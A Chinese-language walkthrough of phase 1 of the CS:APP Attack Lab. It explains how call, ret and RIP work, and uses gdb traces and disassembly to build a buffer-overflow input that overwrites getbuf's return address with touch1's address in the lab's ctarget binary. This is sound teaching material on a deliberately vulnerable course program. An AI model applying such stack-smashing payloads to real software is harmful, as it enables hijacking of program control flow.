# 前置知识
call 指令
ret 指令
寄存器rip
栈
小端模式

**栈向下生长，栈顶在低地址，栈底在高地址**

**指令寄存器（RIP）包含下一条将要被执行的指令的逻辑地址。**

通常情况下，每取出一条指令后，RIP会自增指向下一条指令。在x86_64中RIP的自增也即偏移一定字节。（可通过disassemble 查看下一个地址，字节大小不一定等长）

但是RIP并不总是自增，也有例外，例如call 指令和ret指令。**call指令会将当前RIP的内容压入栈中，将程序的执行权交给目标函数；ret指令则执行出栈操作，将之前压入栈的8个字节的RIP地址弹出，重新放入RIP。**

更多信息参考
[X86/ARM 寄存器](https://www.cnblogs.com/tzj-kernel/p/17960135)
[[register]-ARMV8系统中通用寄存器和系统寄存器的介绍和总结](https://www.bilibili.com/opus/913806141088071748)

# 前置准备工作
下载实验包Attack Lab
可以在这个网站下下载 [Lab Assignments](https://csapp.cs.cmu.edu/3e/labs.html)

下载后的实验包名字应该是 target1.tar

在终端输入``tar -xvf target1.tar``解压
出来的文件应该有6个
```txt
target1/README.txt
target1/ctarget
target1/rtarget
target1/farm.c
target1/cookie.txt
target1/hex2raw
```

进入文件夹后在终端中分别输入
```txt
objdump -d ctarget > ctarget.d
objdump -d rtarget > rtarget.d
```
对两个攻击目标进行反汇编.

记得安装gcc等调试工具/环境

这里讲解的实验环境为：
虚拟机:VMware Workstation17
系统镜像: ubuntu-18.04.5-desktop-amd64.iso

# phase1
第一个阶段是攻击ctarget

首先要明白的是ctarget运行程序时候函数调用顺序是``main() -> ... -> test() -> getbuf()-> Gets()``
然后顺序返回，我们的目标是在``test()``函数调用``getbuf()``函数并且``getbuf()``函数结束后不返回``test()``函数，而是返回``touch1()``函数。

## 先断点观察
打开ctarget.d文件，ctrl+f查找``<test>``找到``test()``函数如下
```c
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
```
我们还能找到调用<test>函数的地方
```c  
  401f1f:	e8 44 fa ff ff       	callq  401968 <test>
  401f24:	83 3d bd 25 20 00 00 	cmpl   $0x0,0x2025bd(%rip)        # 6044e8 <is_checker>
```
打开终端依次输入
```txt
gdb ctarget
break getbuf
layout asm
layout regs
r -q
```
``gdb ctarget``反汇编ctarget可执行文件
``break getbuf``指令就是在``getbuf()``这个函数上打断点。
``layout asm / layout regs``分别是在屏幕上显示出当前汇编执行代码和寄存器
``r -q``r是run的意思表示运行程序，-q表示不向服务器端发送请求(因为这是国外的实验)
(注：layout asm ; layout regs这两条目前是可选选项)

这个时候输入``x/80xb $rsp``打印栈的内容发现401976地址(小端模式！)在栈顶，再往前看是401f24，这两个地址刚好都是分别调用完``getbuf()``函数和``test()``函数的下一个指令的地址。
```txt
(gdb) x/80xb $rsp
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

在调试界面中不断输入``ni``直到中间asm窗口到了``│0x4017bd <getbuf+21> retq``(也就是返回指令)，这个时候看寄存器窗口会发现rsp和rip都亮起。且状态如下
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x7ffff7af2031   140737348837425              │
│rdx            0x606671 6317681                            rsi            0x606670 6317680                            rdi            0x0      0                                    │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca0       0x5561dca0                 r8             0x7ffff7dcf8c0   140737351841984              │
│r9             0x7ffff7fe3540   140737354020160            r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017bd 0x4017bd <getbuf+21>               eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                           
```
这时候rsp是0x5561dca0，再往下一步(也就是执行ret指令)，会发现把栈顶中(也就是0x5561dca0地址下)的8个字节读入了rip之中(也就是0x401971),具体寄存器如下图
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x7ffff7af2031   140737348837425              │
│rdx            0x606671 6317681                            rsi            0x606670 6317680                            rdi            0x0      0                                    │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca8       0x5561dca8                 r8             0x7ffff7dcf8c0   140737351841984              │
│r9             0x7ffff7fe3540   140737354020160            r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x401976 0x401976 <test+14>                 eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                  
```
到这里就解释了**ret指令则执行出栈操作，将之前压入栈的8个字节的RIP地址弹出，重新放入RIP。**
结合RIP寄存器的功能就可以得到``getbuf()``函数返回到``test()``函数的操作就是在``ret``这个指令这一步，其中重点是存放在栈顶(0x5561dca0)的**地址**称**为 (函数调用)返回地址**

阶段一的目标是返回到``touch1()``函数，自然就能想到，如果把返回地址改为``touch1()``函数的地址，那么就可以返回到``touch1()``函数。

## 制作答案
```c
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
注意到``getbuf()``函数中调用了``Gets()``函数，这个函数是将你的输入传入栈中。注意到前面``sub    $0x28,%rsp``，将栈指针减去了0x28字节，也就是开辟了栈空间。
那么结合刚刚的断点分析，可以得到返回地址在栈顶往高地址走0x28字节中。
```txt
(gdb) x/80xb $rsp
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

所以我们需要用0x28个字节的垃圾信息填充满开辟的栈空间，然后再加上``touch1()``函数的地址，就能用``touch1()``函数的地址覆盖掉原来的返回地址。

**phase1.txt :**
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
再次断点调试。
这个时候我们需要先用指令``./hex2raw < phase1.txt > test1.txt``
用自带的小工具将字符文件转换为二进制数据文件
然后就可以在gdb里面输入``r < test1.txt -q``进行运行。
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x5561dc78       1432476792                 rbx            0x55586000       1431855104                 rcx            0x6066a1 6317729                              │
│rdx            0xa      10                                 rsi            0x30     48                                 rdi            0x7ffff7dcda00   140737351834112              │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dc78       0x5561dc78                 r8             0x77     119                                  │
│r9             0x0      0                                  r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017b4 0x4017b4 <getbuf+12>               eflags         0x246    [ PF ZF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
  >│0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 2930 In: getbuf                                                                                                                                    L16   PC: 0x4017b4 
Starting program: /home/xiaojuer/experimet/target1/ctarget < test1.txt -q

Breakpoint 1, getbuf () at buf.c:12
(gdb) ni
(gdb) x/80xb $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
在调用完``Gets()``函数后用指令``x/80xb $rsp``查看栈中的内容，就可以发现0x5561dca0下存放的返回地址被覆盖成了``touch1()``函数的地址了。
而且要注意刚刚phase1.txt的内容其实就是在下面这几行地址里面了，从栈顶往下读入的，**如果到这一步发现内容和期望的不一致，大概率是转换出错或者名字打错了，需要检查前面步骤。**
```txt
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
```
接下来一步是``add $0x28,%rsp``，将刚刚开辟的0x28字节的空间释放回去了，所以如果仅仅是将返回地址放在上面0x28字节中是没有用的。
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x6066a1 6317729                              │
│rdx            0xa      10                                 rsi            0x30     48                                 rdi            0x7ffff7dcda00   140737351834112              │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca0       0x5561dca0                 r8             0x77     119                                  │
│r9             0x0      0                                  r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017bd 0x4017bd <getbuf+21>               eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
  >│0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 2930 In: getbuf                                                                                                                                    L16   PC: 0x4017bd 
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
(gdb) ni
(gdb) x/80xb $rsp 
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcc8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcd0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcd8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dce0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dce8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
执行完``add    $0x28,%rsp``之后就会发现``touch1()``函数的地址就在栈顶，然后执行``ret``指令，从栈顶中读取放在RIP里面就能跳转到``touch1()``函数了。
再次输入``ni``进行下一步查看就能看到程序进入到了``touch1()``函数中。至此答案解释结束。
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x6066a1 6317729                              │
│rdx            0xa      10                                 rsi            0x30     48                                 rdi            0x7ffff7dcda00   140737351834112              │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca8       0x5561dca8                 r8             0x77     119                                  │
│r9             0x0      0                                  r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017c0 0x4017c0 <touch1>                  eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
  >│0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                               
```
